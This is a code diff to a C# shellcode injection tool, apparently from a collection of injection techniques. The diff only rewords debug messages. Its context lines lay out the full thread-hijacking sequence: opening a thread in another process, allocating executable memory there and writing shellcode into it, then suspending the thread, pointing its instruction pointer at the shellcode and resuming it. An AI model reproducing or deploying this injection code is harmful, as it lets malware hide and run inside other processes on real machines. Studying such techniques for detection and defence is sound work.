@@ -16,17 +16,17 @@ namespace ShellcodeInjectionTechniques
 
             // get a handle to the thread
             IntPtr hThread = OpenThread(ThreadAccess.GET_CONTEXT | ThreadAccess.SET_CONTEXT, false, (UInt32)thread.Id);
-            Debug("[+] OpenThread() - Thread handle: 0x{0}", new string[] { hThread.ToString("X") });
+            Debug("[+] OpenThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
 
             // allocate some memory for our shellcode
             IntPtr pAddr = VirtualAllocEx(target.Handle, IntPtr.Zero, (UInt32)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.PAGE_EXECUTE_READWRITE);
             Debug("[+] VirtualAllocEx(), assigned: 0x{0}", new string[] { pAddr.ToString("X") });
 
             // write the shellcode into the allocated memory
-            Debug("[+] WriteProcessMemory(): 0x{0}", new string[] { pAddr.ToString("X") });
+            Debug("[+] WriteProcessMemory() - remote address: 0x{0}", new string[] { pAddr.ToString("X") });
             WriteProcessMemory(target.Handle, pAddr, shellcode, shellcode.Length, out IntPtr lpNumberOfBytesWritten);
 
-            Debug("[+] SuspendThread(): 0x{0}", new string[] { hThread.ToString("X") });
+            Debug("[+] SuspendThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
             SuspendThread(hThread);
 
             //CONTEXT_ALL = 0x10001F
@@ -34,7 +34,7 @@ namespace ShellcodeInjectionTechniques
             ctx.ContextFlags = 0x10001F;
 
             // get the thread context - we are looking to manipulate the instruction pointer register
-            Debug("[+] GetThreadContext(): 0x{0}", new string[] { hThread.ToString("X") });
+            Debug("[+] GetThreadContext() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
             if(!GetThreadContext(hThread, ref ctx))
             {
                 Console.WriteLine("[!] Error: {0}", GetLastError());
@@ -50,7 +50,7 @@ namespace ShellcodeInjectionTechniques
             Debug("[+] SetThreadContext(), RIP assigned: 0x{0}", new string[] { pAddr.ToString("X") });
             SetThreadContext(hThread, ref ctx);
 
-            Debug("[+] ResumeThread(): 0x{0}", new string[] { hThread.ToString("X") });
+            Debug("[+] ResumeThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
             ResumeThread(hThread);
         }
 
